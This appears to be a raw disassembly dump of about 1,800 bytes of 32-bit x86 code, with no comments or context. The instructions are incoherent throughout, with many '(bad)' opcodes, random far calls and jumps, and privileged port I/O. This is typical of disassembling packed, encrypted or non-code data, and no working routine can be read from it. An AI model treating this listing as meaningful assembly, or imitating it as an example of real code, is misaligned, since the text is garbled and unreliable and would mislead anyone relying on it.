  41f7ae:	cmp    cl,BYTE PTR [eax+0x37]
  41f7b1:	push   esi
  41f7b2:	inc    ebp
  41f7b3:	loope  0x41f780
  41f7b5:	loop   0x41f78c
  41f7b7:	ds cdq 
  41f7b9:	loop   0x41f762
  41f7bb:	sub    eax,0xf6f23225
  41f7c0:	cs retf 
  41f7c2:	aaa    
  41f7c3:	dec    ebx
  41f7c4:	sbb    al,0x2c
  41f7c6:	adc    DWORD PTR [edx],edi
  41f7c8:	in     al,0xe5
  41f7ca:	jns    0x41f81e
  41f7cc:	mov    WORD PTR [eax-0x59768e8a],ss
  41f7d2:	nop
  41f7d3:	xchg   ecx,eax
  41f7d4:	test   eax,0x292871c1
  41f7d9:	and    DWORD PTR [eax],esp
  41f7db:	arpl   WORD PTR [esi-0x1ce1d021],ax
  41f7e1:	ror    ch,1
  41f7e3:	retf   
  41f7e4:	sub    al,BYTE PTR [edi-0x24]
  41f7e7:	pop    eax
  41f7e8:	ss in  eax,dx
  41f7ea:	or     eax,0x8ea9346
  41f7ef:	push   0xffffff96
  41f7f1:	into   
  41f7f2:	js     0x41f858
  41f7f4:	and    esi,esi
  41f7f6:	pop    ecx
  41f7f7:	xchg   ebp,eax
  41f7f8:	pushf  
  41f7f9:	js     0x41f78b
  41f7fb:	ja     0x41f7d7
  41f7fd:	rcr    DWORD PTR [edx+0x5e],cl
  41f800:	test   DWORD PTR [ecx-0x35c051d1],ecx
  41f806:	lods   al,BYTE PTR ds:[esi]
  41f807:	cwde   
  41f808:	cld    
  41f809:	dec    ebx
  41f80a:	bnd js 0x41f880
  41f80d:	push   cs
  41f80e:	test   eax,0x6240fb99
  41f813:	xlat   BYTE PTR ds:[ebx]
  41f814:	sbb    edi,DWORD PTR [esi-0x3cf66e99]
  41f81a:	out    dx,al
  41f81b:	pop    ebp
  41f81c:	mov    ds:0xa60deb63,al
  41f821:	call   0x9716733b
  41f826:	xchg   edx,eax
  41f827:	adc    BYTE PTR [ebx+0x31],al
  41f82a:	cs retf 0x79cf
  41f82e:	aas    
  41f82f:	push   cs
  41f830:	pushf  
  41f831:	icebp  
  41f832:	or     BYTE PTR [esi+edi*8-0x53881b92],0x73
  41f83a:	and    DWORD PTR [edi+0x30ae3741],edi
  41f840:	sub    eax,0x2210603c
  41f845:	std    
  41f846:	push   es
  41f847:	scas   al,BYTE PTR es:[edi]
  41f848:	mov    ch,0xb8
  41f84a:	or     eax,0xd60d9f36
  41f84f:	jb     0x41f88c
  41f851:	add    ebx,DWORD PTR [ebx]
  41f853:	inc    eax
  41f854:	add    al,0x49
  41f856:	daa    
  41f857:	enter  0x97aa,0x86
  41f85b:	neg    BYTE PTR [edi+ebx*2]
  41f85e:	loope  0x41f848
  41f860:	dec    edi
  41f861:	push   esi
  41f862:	test   BYTE PTR [ebp+edx*2-0x7d98a6e9],dl
  41f869:	(bad)  
  41f86a:	loopne 0x41f84e
  41f86c:	pop    ds
  41f86d:	push   edi
  41f86e:	ja     0x41f84a
  41f870:	or     edx,esi
  41f872:	or     BYTE PTR [ecx-0x37382370],dh
  41f878:	(bad)  
  41f879:	nop
  41f87a:	xlat   BYTE PTR ds:[ebx]
  41f87b:	in     al,dx
  41f87c:	(bad)  
  41f87d:	or     al,0x65
  41f87f:	ss fadd DWORD PTR gs:[ebx-0x46b93da0]
  41f887:	popf   
  41f888:	jge    0x41f8c4
  41f88a:	pop    ss
  41f88b:	xor    DWORD PTR ds:0x6a7357d2,ebp
  41f891:	(bad)  
  41f892:	stc    
  41f893:	dec    esp
  41f894:	cdq    
  41f895:	dec    ecx
  41f896:	pop    ss
  41f897:	idiv   BYTE PTR [ecx-0xf]
  41f89a:	les    eax,FWORD PTR [ebx-0x3d04c20d]
  41f8a0:	jb     0x41f912
  41f8a2:	adc    al,0xcb
  41f8a4:	jnp    0x41f8a0
  41f8a6:	clc    
  41f8a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8a8:	pushf  
  41f8a9:	leave  
  41f8aa:	(bad)  
  41f8ab:	repnz aaa 
  41f8ad:	add    ch,bl
  41f8af:	shl    BYTE PTR [ebx],0xbe
  41f8b2:	and    BYTE PTR [esi+0x6e13bc7d],ch
  41f8b8:	je     0x41f89f
  41f8ba:	ud2    
  41f8bc:	call   0x68f4:0xe7da9865
  41f8c3:	aas    
  41f8c4:	ins    DWORD PTR es:[edi],dx
  41f8c5:	retf   
  41f8c6:	inc    eax
  41f8c7:	call   0x5f29ca89
  41f8cc:	jge    0x41f8ea
  41f8ce:	rcl    BYTE PTR [edi+eax*8-0x12c67d16],1
  41f8d5:	jge    0x41f911
  41f8d7:	mov    dl,0x96
  41f8d9:	mov    ah,BYTE PTR [edi]
  41f8db:	(bad)  
  41f8dc:	ins    BYTE PTR es:[edi],dx
  41f8dd:	scas   eax,DWORD PTR es:[edi]
  41f8de:	and    esi,DWORD PTR [edi-0x69]
  41f8e1:	mov    edx,0x5c8730ab
  41f8e6:	icebp  
  41f8e7:	mov    WORD PTR [eax],cs
  41f8e9:	pop    eax
  41f8ea:	dec    ecx
  41f8eb:	ror    DWORD PTR [ecx],0xcb
  41f8ee:	jl     0x41f914
  41f8f0:	and    ch,dl
  41f8f2:	jns    0x41f923
  41f8f4:	cwde   
  41f8f5:	addr16 shl ch,1
  41f8f8:	arpl   WORD PTR ds:0x974b15c0,si
  41f8fe:	mov    ss,WORD PTR [ebx-0x11587761]
  41f904:	mov    bl,BYTE PTR [edi-0x1e9dc0be]
  41f90a:	outs   dx,DWORD PTR ds:[esi]
  41f90b:	jnp    0x41f95f
  41f90d:	addr16 push cs
  41f90f:	pop    ecx
  41f910:	jne    0x41f936
  41f912:	bound  esi,QWORD PTR [ebp+0x5a2378ad]
  41f918:	inc    eax
  41f919:	cs mov esi,0x6da8f277
  41f91f:	jno    0x41f928
  41f921:	std    
  41f922:	jb     0x41f8ba
  41f924:	add    esp,DWORD PTR [esi]
  41f926:	dec    ebp
  41f927:	div    BYTE PTR [esi]
  41f929:	jge    0x41f997
  41f92b:	maxps  xmm5,XMMWORD PTR [esi+0x3]
  41f92f:	call   0x107ef75
  41f934:	fcmovne st,st(5)
  41f936:	sub    DWORD PTR [edi+0x3025f49d],edx
  41f93c:	sub    DWORD PTR [ecx],ebp
  41f93e:	mov    eax,0xe7624a7f
  41f943:	js     0x41f91a
  41f945:	add    al,0x37
  41f947:	js     0x41f8f6
  41f949:	aaa    
  41f94a:	sub    BYTE PTR [esi],ah
  41f94c:	pop    ds
  41f94d:	call   DWORD PTR [edi-0xd903907]
  41f953:	xlat   BYTE PTR ds:[ebx]
  41f954:	or     BYTE PTR [ebp+0x24],dh
  41f957:	adc    eax,0x95077d2a
  41f95c:	out    dx,al
  41f95d:	in     al,0xd4
  41f95f:	push   ecx
  41f960:	inc    edi
  41f961:	adc    edx,DWORD PTR [edi]
  41f963:	loop   0x41f91a
  41f965:	inc    edi
  41f966:	push   ebx
  41f967:	in     eax,0xc7
  41f969:	and    eax,DWORD PTR [edx-0x7a]
  41f96c:	retf   0x6646
  41f96f:	mov    edi,0xb900f90b
  41f974:	mov    edx,0xe58b859c
  41f979:	daa    
  41f97a:	(bad)  
  41f97b:	cld    
  41f97c:	test   DWORD PTR [eax],0x98ec72cc
  41f982:	imul   ebx,ecx,0x5382c726
  41f988:	pop    edx
  41f989:	fmul   QWORD PTR [ecx+ebp*4]
  41f98c:	fwait
  41f98d:	jle    0x41f9ea
  41f98f:	mov    al,ds:0x2f8f354
  41f994:	inc    ecx
  41f995:	dec    esi
  41f996:	addr16 jns 0x41f9e9
  41f999:	pop    ds
  41f99a:	xchg   esp,eax
  41f99b:	std    
  41f99c:	inc    edi
  41f99d:	push   eax
  41f99e:	and    eax,0x317748dd
  41f9a3:	inc    ebp
  41f9a4:	aam    0xa8
  41f9a6:	stc    
  41f9a7:	add    DWORD PTR [ebp+0x7f1e346a],esi
  41f9ad:	push   esi
  41f9ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9af:	jno    0x41fa07
  41f9b1:	add    ebx,DWORD PTR ds:0x8ddc6d70
  41f9b7:	repnz shl DWORD PTR [ebx-0x80],cl
  41f9bb:	sub    esi,DWORD PTR [ebp-0x1d]
  41f9be:	and    al,0x27
  41f9c0:	mov    cl,0x5e
  41f9c2:	sbb    ebp,0x10
  41f9c5:	cmp    al,0xec
  41f9c7:	jecxz  0x41f9aa
  41f9c9:	pop    eax
  41f9ca:	fldcw  WORD PTR [ecx+0x54]
  41f9cd:	push   es
  41f9ce:	add    BYTE PTR [ebp+0x34],bl
  41f9d1:	pop    ebp
  41f9d2:	add    bl,BYTE PTR [ecx+0x1cf1294a]
  41f9d8:	bound  edx,QWORD PTR [eax-0x663de48f]
  41f9de:	and    al,0x1
  41f9e0:	and    eax,0x65
  41f9e3:	aam    0xcf
  41f9e5:	mov    al,bl
  41f9e7:	std    
  41f9e8:	xchg   ebp,eax
  41f9e9:	dec    esp
  41f9ea:	test   BYTE PTR [ebp-0x15842372],0x4c
  41f9f1:	nop
  41f9f2:	sub    eax,0x8f7d59ad
  41f9f7:	test   eax,0xd70fe445
  41f9fc:	fldenv [edi+0x5a444bc5]
  41fa02:	cs nop
  41fa04:	and    bl,BYTE PTR [eax+0x9]
  41fa07:	cli    
  41fa08:	add    esp,esp
  41fa0a:	inc    eax
  41fa0b:	into   
  41fa0c:	lds    ebx,FWORD PTR [edx+esi*4]
  41fa0f:	lods   eax,DWORD PTR ds:[esi]
  41fa10:	cmp    al,0x7
  41fa12:	aaa    
  41fa13:	sub    ch,BYTE PTR [edi+0x27dac016]
  41fa19:	in     eax,0x92
  41fa1b:	(bad)  
  41fa1c:	adc    ah,BYTE PTR [esi+0x29]
  41fa1f:	pop    eax
  41fa20:	aad    0x62
  41fa22:	mov    esp,0xdfdd0fcd
  41fa27:	inc    ecx
  41fa28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa29:	sbb    esi,esi
  41fa2b:	inc    edx
  41fa2c:	repz out 0x3d,al
  41fa2f:	add    esp,DWORD PTR [ebx+0x45]
  41fa32:	or     edx,DWORD PTR [ecx-0x2b]
  41fa35:	pop    eax
  41fa36:	cwde   
  41fa37:	dec    eax
  41fa38:	pop    esp
  41fa39:	push   ebp
  41fa3a:	ja     0x41faa5
  41fa3c:	xor    ah,BYTE PTR [ecx+0x73faa267]
  41fa42:	adc    eax,0x2b3b6ff
  41fa47:	out    0xc1,eax
  41fa49:	test   BYTE PTR [ebx-0x17],bh
  41fa4c:	inc    ebp
  41fa4d:	add    ecx,eax
  41fa4f:	mov    edi,0x18d13226
  41fa54:	sbb    ebp,ebp
  41fa56:	xchg   dh,al
  41fa58:	dec    eax
  41fa59:	aas    
  41fa5a:	es leave 
  41fa5c:	push   ds
  41fa5d:	mov    al,ds:0x8c2f56db
  41fa62:	test   edi,0x40cf86dc
  41fa68:	shl    bh,cl
  41fa6a:	aam    0x32
  41fa6c:	lods   eax,DWORD PTR ds:[esi]
  41fa6d:	stos   BYTE PTR es:[edi],al
  41fa6e:	leave  
  41fa6f:	push   ecx
  41fa70:	pop    edx
  41fa71:	pop    es
  41fa72:	cdq    
  41fa73:	push   es
  41fa74:	cmp    ch,BYTE PTR [edi+0x52]
  41fa77:	dec    eax
  41fa78:	or     BYTE PTR [edx-0x14],bl
  41fa7b:	push   esi
  41fa7c:	xchg   ebp,eax
  41fa7d:	push   es
  41fa7e:	sub    dh,BYTE PTR [ebp-0x56362c3]
  41fa84:	shl    DWORD PTR [ecx-0x46747f22],0x7d
  41fa8b:	sub    BYTE PTR [ecx],ah
  41fa8d:	jb     0x41fa50
  41fa8f:	repz pusha 
  41fa91:	out    dx,eax
  41fa92:	push   eax
  41fa93:	dec    ecx
  41fa94:	pop    eax
  41fa95:	sub    al,0xd4
  41fa97:	lahf   
  41fa98:	pop    esp
  41fa99:	loop   0x41fabe
  41fa9b:	pslld  mm2,mm1
  41fa9e:	push   0xffffffbc
  41faa0:	std    
  41faa1:	xchg   ecx,eax
  41faa2:	arpl   WORD PTR [edx],si
  41faa4:	fidivr WORD PTR [edx+0x73]
  41faa7:	sub    edi,DWORD PTR [edx+ebx*8]
  41faaa:	in     eax,dx
  41faab:	mov    ds:0xbddbaa5c,al
  41fab0:	cmp    ebp,DWORD PTR [eax]
  41fab2:	push   es
  41fab3:	shl    DWORD PTR [ebx-0x3e],cl
  41fab6:	mov    ?,WORD PTR [edi-0x2b]
  41fab9:	mov    al,ds:0x7480f79e
  41fabe:	mov    ch,0xd3
  41fac0:	and    eax,0xb20129d6
  41fac5:	rol    BYTE PTR [edi],1
  41fac7:	sub    DWORD PTR [ecx-0x45],esi
  41faca:	mov    edi,0x36b3abd2
  41facf:	ret    
  41fad0:	and    al,0x4d
  41fad2:	dec    esp
  41fad3:	sub    ebx,DWORD PTR [ebp-0x2f85ada]
  41fad9:	inc    edx
  41fada:	cmp    edi,eax
  41fadc:	mov    eax,ds:0xbf58cd40
  41fae1:	je     0x41fb59
  41fae3:	xor    edx,0x3
  41fae6:	pushf  
  41fae7:	loop   0x41fa87
  41fae9:	adc    eax,0xaf62c4a3
  41faee:	aas    
  41faef:	xchg   BYTE PTR [edx-0x21db494e],bl
  41faf5:	test   al,0x9a
  41faf7:	loop   0x41fb1a
  41faf9:	out    0xf0,eax
  41fafb:	sub    DWORD PTR [eax+0x35],ebp
  41fafe:	mov    dl,0xc9
  41fb00:	sbb    dl,BYTE PTR [ebp-0x26]
  41fb03:	push   0x39
  41fb05:	xchg   esi,eax
  41fb06:	bound  edi,QWORD PTR [ecx+0x22]
  41fb09:	or     al,0x9f
  41fb0b:	lahf   
  41fb0c:	cmp    dl,BYTE PTR [edx+0x39108b53]
  41fb12:	mov    ah,0xe1
  41fb14:	mov    esp,0xbf079fed
  41fb19:	scas   eax,DWORD PTR es:[edi]
  41fb1a:	leave  
  41fb1b:	nop
  41fb1c:	mov    eax,0xb5df8307
  41fb21:	mov    bh,0x4d
  41fb23:	pop    es
  41fb24:	and    eax,0x9ffae897
  41fb29:	mov    ah,0x9e
  41fb2b:	sub    ecx,ebp
  41fb2d:	fnsave [ecx-0x7c794dfd]
  41fb33:	mov    cl,0xc
  41fb35:	mov    ds,WORD PTR [ecx+edi*1+0x1d]
  41fb39:	and    DWORD PTR [edi],edx
  41fb3b:	or     eax,0xc844a773
  41fb40:	call   0x827d1249
  41fb45:	inc    esp
  41fb46:	mov    edi,0xaeab209d
  41fb4b:	pop    eax
  41fb4c:	xlat   BYTE PTR ds:[ebx]
  41fb4d:	mov    al,BYTE PTR [ebx+eax*4]
  41fb50:	dec    ecx
  41fb51:	loopne 0x41fad8
  41fb53:	outs   dx,DWORD PTR ds:[esi]
  41fb54:	je     0x41fb6b
  41fb56:	push   edx
  41fb57:	shl    DWORD PTR ds:0x7b155c16,cl
  41fb5d:	mov    esi,0x201da56c
  41fb62:	sti    
  41fb63:	xchg   ecx,eax
  41fb64:	out    0x3a,al
  41fb66:	rcr    DWORD PTR [eax+eiz*8],0x4a
  41fb6a:	xor    ebx,DWORD PTR [eax-0x54b499eb]
  41fb70:	retf   0x50ab
  41fb73:	aam    0x4d
  41fb75:	int3   
  41fb76:	inc    ecx
  41fb77:	mov    esi,0xcf22d729
  41fb7c:	out    0xa6,al
  41fb7e:	sub    ebp,0xffffffd0
  41fb81:	and    al,0xcd
  41fb83:	xchg   esp,eax
  41fb84:	mov    dl,0xa5
  41fb86:	ret    0x52f5
  41fb89:	push   ecx
  41fb8a:	clc    
  41fb8b:	pop    ds
  41fb8c:	loop   0x41fc0c
  41fb8e:	mov    esp,0xc8527460
  41fb93:	sbb    al,0x3c
  41fb95:	mov    edi,0x229b6dbe
  41fb9a:	js     0x41fb9e
  41fb9c:	and    BYTE PTR [ebx-0x74e1bca6],0x9c
  41fba3:	js     0x41fc0f
  41fba5:	dec    edi
  41fba6:	inc    edx
  41fba7:	pusha  
  41fba8:	(bad)  
  41fba9:	cmp    eax,DWORD PTR [edi+0x31]
  41fbac:	dec    esp
  41fbad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbae:	loopne 0x41fbb3
  41fbb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbb1:	ret    
  41fbb2:	jne    0x41fc0f
  41fbb4:	push   edi
  41fbb5:	mov    dh,0xd1
  41fbb7:	sub    eax,0x8895a58c
  41fbbc:	pop    esp
  41fbbd:	dec    esi
  41fbbe:	sti    
  41fbbf:	aad    0x85
  41fbc1:	les    edi,FWORD PTR [esi+0x77]
  41fbc4:	lds    esp,FWORD PTR [eax-0x26]
  41fbc7:	jnp    0x41fc2a
  41fbc9:	ss cdq 
  41fbcb:	xlat   BYTE PTR ds:[ebx]
  41fbcc:	fmul   QWORD PTR [edx+0xb8273eb]
  41fbd2:	mov    esi,0xd0c480cc
  41fbd7:	(bad)  
  41fbd8:	mov    dh,0x76
  41fbda:	stos   BYTE PTR es:[edi],al
  41fbdb:	and    al,0x99
  41fbdd:	cmp    esi,eax
  41fbdf:	aam    0x28
  41fbe1:	rol    BYTE PTR [ecx-0x78],0x99
  41fbe5:	and    al,0x4c
  41fbe7:	into   
  41fbe8:	pop    ds
  41fbe9:	sahf   
  41fbea:	pextrw ebx,(bad),0xc5
  41fbec:	pop    ecx
  41fbed:	sbb    edi,DWORD PTR ds:0x645b213f
  41fbf3:	mov    al,0x21
  41fbf5:	sbb    edi,esp
  41fbf7:	and    al,0x2d
  41fbf9:	cmovg  esi,DWORD PTR [ebp-0xc]
  41fbfd:	aad    0x3b
  41fbff:	stos   BYTE PTR es:[edi],al
  41fc00:	fdiv   QWORD PTR [edx-0x240ee4e9]
  41fc06:	pop    edi
  41fc07:	push   edx
  41fc08:	int    0x20
  41fc0a:	push   ecx
  41fc0b:	int    0x1a
  41fc0d:	and    ecx,DWORD PTR [esi+0x6e]
  41fc10:	xor    edx,0x0
  41fc13:	frstor [edx+0x5cec525f]
  41fc19:	mov    ebx,0x6a01ffc3
  41fc1e:	or     eax,0xd9f0767b
  41fc23:	addr16 ret 0x6c0a
  41fc27:	je     0x41fba9
  41fc29:	pusha  
  41fc2a:	mov    ds:0x7b95bcae,al
  41fc2f:	mov    ecx,0xabac9dc6
  41fc34:	mov    BYTE PTR [edx],bl
  41fc36:	fist   DWORD PTR [edi-0x9794be4]
  41fc3c:	xor    eax,0x584990f0
  41fc41:	cmp    bh,BYTE PTR [eax+edx*1-0x70]
  41fc45:	ret    
  41fc46:	out    dx,al
  41fc47:	jne    0x41fca0
  41fc49:	(bad)  
  41fc4a:	cmp    eax,DWORD PTR ds:0xbd338ecc
  41fc50:	sbb    DWORD PTR [esp+ebp*4],ecx
  41fc53:	and    BYTE PTR [ebp-0x200a369],ch
  41fc59:	rcr    DWORD PTR [ebp-0x6c],cl
  41fc5c:	popa   
  41fc5d:	iret   
  41fc5e:	aam    0xa5
  41fc60:	loopne 0x41fc09
  41fc62:	adc    dh,BYTE PTR [edi+0x4a]
  41fc65:	sub    BYTE PTR [ecx],dl
  41fc67:	rcl    al,0x73
  41fc6a:	mov    edx,0x6a8b6492
  41fc6f:	dec    edx
  41fc70:	das    
  41fc71:	mov    ebx,0x1b800cd
  41fc76:	inc    eax
  41fc77:	pop    ebp
  41fc78:	jle    0x41fc28
  41fc7a:	xchg   ebx,eax
  41fc7b:	cmp    eax,DWORD PTR [ecx]
  41fc7d:	push   ebp
  41fc7e:	nop
  41fc7f:	push   DWORD PTR [eax-0x57]
  41fc82:	outs   dx,BYTE PTR ds:[esi]
  41fc83:	call   0xe1e6:0x5e4ebe1a
  41fc8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc8b:	jp     0x41fc41
  41fc8d:	or     esp,DWORD PTR [edx+0x65a75455]
  41fc93:	jns    0x41fc44
  41fc95:	adc    bh,BYTE PTR [ecx+0x41b9bce5]
  41fc9b:	(bad)  
  41fc9c:	gs call 0x93046220
  41fca2:	aam    0x44
  41fca4:	xchg   edx,eax
  41fca5:	xchg   ebp,eax
  41fca6:	bound  ecx,QWORD PTR [ecx+edx*2-0x13]
  41fcaa:	gs enter 0x9988,0x9a
  41fcaf:	adc    al,0x2d
  41fcb1:	or     eax,0xa4641ec2
  41fcb6:	mov    al,ds:0x9acc96f9
  41fcbb:	push   es
  41fcbc:	stos   DWORD PTR es:[edi],eax
  41fcbd:	cmp    ah,BYTE PTR [eax+0xf]
  41fcc0:	ret    0xec7b
  41fcc3:	shl    BYTE PTR [eax],1
  41fcc5:	stos   DWORD PTR es:[edi],eax
  41fcc6:	and    bh,cl
  41fcc8:	pop    esp
  41fcc9:	sbb    ecx,DWORD PTR [edx+ebx*8-0x2c]
  41fccd:	mov    dh,0xfd
  41fccf:	jnp    0x41fcca
  41fcd1:	xchg   DWORD PTR [ebx-0x1fc2069],esp
  41fcd7:	ins    DWORD PTR es:[edi],dx
  41fcd8:	mov    esi,0xab19da43
  41fcdd:	adc    bh,bh
  41fcdf:	int3   
  41fce0:	test   eax,0x308653cd
  41fce5:	mov    bl,bh
  41fce7:	jnp    0x41fce9
  41fce9:	(bad)  
  41fcea:	sub    al,0x2e
  41fcec:	retf   
  41fced:	loop   0x41fd26
  41fcef:	mov    ecx,esi
  41fcf1:	xchg   ecx,eax
  41fcf2:	stos   DWORD PTR es:[edi],eax
  41fcf3:	mov    bh,0xc
  41fcf5:	fs dec edx
  41fcf7:	mov    ds:0xba3939b1,eax
  41fcfc:	add    BYTE PTR [eax-0x3f],0x72
  41fd00:	add    DWORD PTR [edx],eax
  41fd02:	adc    eax,0xca52e107
  41fd07:	xchg   esp,eax
  41fd08:	xlat   BYTE PTR ds:[ebx]
  41fd09:	mov    ch,0xda
  41fd0b:	xor    DWORD PTR [edi],ebp
  41fd0d:	jne    0x41fd42
  41fd0f:	cdq    
  41fd10:	les    esi,FWORD PTR [edx]
  41fd12:	popa   
  41fd13:	shr    ah,0x38
  41fd16:	pop    eax
  41fd17:	and    DWORD PTR [esi+0x75a7beda],eax
  41fd1d:	mov    DWORD PTR [ebp+0x8e5387],ebp
  41fd23:	push   esi
  41fd24:	mov    ebp,DWORD PTR [edi]
  41fd26:	enter  0x8f8f,0xb7
  41fd2a:	iret   
  41fd2b:	adc    al,0x9a
  41fd2d:	dec    esp
  41fd2e:	mov    ?,edx
  41fd30:	(bad)  
  41fd31:	or     edi,edx
  41fd33:	faddp  st(4),st
  41fd35:	arpl   si,ax
  41fd37:	push   ds
  41fd38:	xchg   esi,eax
  41fd39:	mov    dh,0x60
  41fd3b:	hlt    
  41fd3c:	enter  0xb81f,0x82
  41fd40:	ins    BYTE PTR es:[edi],dx
  41fd41:	in     eax,0xa1
  41fd43:	retf   
  41fd44:	inc    ecx
  41fd45:	jmp    0x85bb:0x345bc9ba
  41fd4c:	sub    eax,0xd56f22ac
  41fd51:	out    0xe1,eax
  41fd53:	sub    DWORD PTR [esi],ecx
  41fd55:	clc    
  41fd56:	jge    0x41fd7d
  41fd58:	lods   al,BYTE PTR ds:[esi]
  41fd59:	bound  eax,QWORD PTR [edi]
  41fd5b:	stc    
  41fd5c:	lds    edi,FWORD PTR [edi+eax*4-0x37]
  41fd60:	bswap  edi
  41fd62:	or     edx,0xb9a22d8e
  41fd68:	xchg   DWORD PTR [eax-0x327095f3],edi
  41fd6e:	and    BYTE PTR [edi],al
  41fd70:	cmp    eax,0x76c7eced
  41fd75:	jmp    0x41fdcd
  41fd77:	aas    
  41fd78:	lock pop ebp
  41fd7a:	loopne 0x41fdda
  41fd7c:	dec    esp
  41fd7d:	lahf   
  41fd7e:	clc    
  41fd7f:	leave  
  41fd80:	shl    BYTE PTR [ebx+eiz*2-0x6d],1
  41fd84:	xor    eax,DWORD PTR [ebx+edx*4]
  41fd87:	out    0x93,eax
  41fd89:	xor    bl,ch
  41fd8b:	jge    0x41fd11
  41fd8d:	pop    es
  41fd8e:	arpl   WORD PTR [esi-0xde60ffb],dx
  41fd94:	stc    
  41fd95:	add    bh,BYTE PTR [ebp-0x3ca5f001]
  41fd9b:	sbb    eax,0xc132e463
  41fda0:	test   BYTE PTR [edi-0x68],ah
  41fda3:	jmp    0x92b0:0x757a7ca5
  41fdaa:	adc    al,ah
  41fdac:	shl    BYTE PTR [eax],0xd8
  41fdaf:	dec    ebp
  41fdb0:	dec    esp
  41fdb1:	loopne 0x41fdf8
  41fdb3:	stc    
  41fdb4:	fistp  DWORD PTR ds:0x773dd308
  41fdba:	aaa    
  41fdbb:	inc    eax
  41fdbc:	fldcw  WORD PTR [esi+0x1a]
  41fdbf:	aam    0x7f
  41fdc1:	stos   BYTE PTR es:[edi],al
  41fdc2:	xchg   BYTE PTR [ebx+eiz*8+0x101704be],ch
  41fdc9:	js     0x41fd82
  41fdcb:	jne    0x41fe24
  41fdcd:	icebp  
  41fdce:	cmp    al,0x87
  41fdd0:	clc    
  41fdd1:	inc    esi
  41fdd2:	mov    esp,0x8a17d330
  41fdd7:	loope  0x41fdb3
  41fdd9:	mov    dh,0xb6
  41fddb:	ror    BYTE PTR [ebx-0xd],1
  41fdde:	nop
  41fddf:	nop
  41fde0:	jecxz  0x41fe40
  41fde2:	shr    DWORD PTR [ecx+0x9c29bac],1
  41fde8:	jp     0x41fe0c
  41fdea:	xchg   edi,eax
  41fdeb:	or     BYTE PTR [esi-0x18],dh
  41fdee:	daa    
  41fdef:	pop    ecx
  41fdf0:	push   esp
  41fdf1:	cmp    ebx,DWORD PTR gs:[edi]
  41fdf4:	repnz fmul st(0),st
  41fdf7:	loopne 0x41fdca
  41fdf9:	ret    
  41fdfa:	mov    esp,0x23d92e76
  41fdff:	jns    0x41fdf6
  41fe01:	pop    esi
  41fe02:	adc    al,0x9f
  41fe04:	dec    ecx
  41fe05:	sbb    eax,0x51f87c4c
  41fe0a:	inc    edx
  41fe0b:	test   eax,0x10e478ed
  41fe10:	add    edi,DWORD PTR [ecx+0x6e]
  41fe13:	pop    ebx
  41fe14:	jno    0x41fe6d
  41fe16:	push   esp
  41fe17:	push   edx
  41fe18:	adc    BYTE PTR [ebx+0x6b],bl
  41fe1b:	jp     0x41fe7d
  41fe1d:	in     eax,dx
  41fe1e:	xchg   BYTE PTR ds:0xf76ca12a,cl
  41fe24:	daa    
  41fe25:	rol    esi,1
  41fe27:	xchg   edi,eax
  41fe28:	dec    ebx
  41fe29:	xchg   DWORD PTR [esi+edi*2],esp
  41fe2c:	mov    esi,0xeef7e644
  41fe31:	nop
  41fe32:	aam    0xea
  41fe34:	inc    esp
  41fe35:	or     ebp,DWORD PTR [eax]
  41fe37:	ret    
  41fe38:	inc    esp
  41fe39:	cmp    cl,al
  41fe3b:	cmp    eax,ebp
  41fe3d:	xor    BYTE PTR [esi],0x86
  41fe40:	std    
  41fe41:	imul   esi,DWORD PTR [edi+0x69],0xffffff86
  41fe45:	lock mov dl,0xbd
  41fe48:	cmp    al,0xf2
  41fe4a:	clc    
  41fe4b:	inc    edx
  41fe4c:	push   ebp
  41fe4d:	xlat   BYTE PTR ds:[ebx]
  41fe4e:	xor    al,0x1f
  41fe50:	rol    BYTE PTR ds:[edi-0x8e84b0],1
  41fe57:	xor    eax,DWORD PTR [ecx]
  41fe59:	xlat   BYTE PTR ds:[ebx]
  41fe5a:	loop   0x41fdf4
  41fe5c:	loope  0x41fecc
  41fe5e:	or     al,0x73
  41fe60:	stos   BYTE PTR es:[edi],al
  41fe61:	inc    eax
  41fe62:	inc    esp
  41fe63:	lods   al,BYTE PTR ds:[esi]
  41fe64:	and    DWORD PTR [esi-0x2e],edx
  41fe67:	imul   ebp,DWORD PTR [ebp+0x4a],0x43
  41fe6b:	fist   WORD PTR [ecx+esi*4-0x49]
  41fe6f:	push   es
  41fe70:	add    eax,0x1424f4ed
  41fe75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe76:	cmc    
  41fe77:	stos   BYTE PTR es:[edi],al
  41fe78:	cmp    bl,0x75
  41fe7b:	or     ebp,esp
  41fe7d:	jno    0x41fe36
  41fe7f:	xchg   esi,eax
  41fe80:	adc    ah,ch
  41fe82:	push   0x48
  41fe84:	pushf  
  41fe85:	jnp    0x41fe4d
  41fe87:	fs test eax,0x69e9c9ce
  41fe8d:	jg     0x41fe76
  41fe8f:	push   0x66
  41fe91:	xchg   edi,eax
  41fe92:	mov    edi,0xbfd2c881
  41fe97:	test   al,0x54
  41fe99:	jl     0x41fe8d
  41fe9b:	jecxz  0x41fee4
  41fe9d:	sbb    dh,BYTE PTR [ebx]
  41fe9f:	dec    ebp
  41fea0:	adc    al,0xa9
  41fea2:	retf   0xc93b
  41fea5:	sub    eax,0x9512acf4
  41feaa:	out    dx,al
  41feab:	in     al,0x82
  41fead:	repnz rcr DWORD PTR [ecx],0xdc
  41feb1:	xor    DWORD PTR [edi-0x28c34c36],eax
  41feb7:	stos   BYTE PTR es:[edi],al
  41feb8:	push   ebp
  41feb9:	mov    edi,0x4fd376cf
  41febe:	cmp    ch,BYTE PTR [ebp-0x67f8db3a]
  41fec4:	popa   
  41fec5:	ins    BYTE PTR es:[edi],dx
  41fec6:	stos   DWORD PTR es:[edi],eax
  41fec7:	js     0x41fefe
  41fec9:	aas    
  41feca:	fwait
  41fecb:	mov    esp,0xf8cf6b66
  41fed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fed1:	data16 mov BYTE PTR [eax],cl
  41fed4:	jp     0x41ff30
  41fed6:	leave  
  41fed7:	enter  0xf54,0x91
  41fedb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fedc:	xchg   ebx,eax
  41fedd:	mov    ah,0xa0
  41fedf:	cmp    esp,DWORD PTR [eax+ecx*1]
  41fee2:	mov    eax,esp
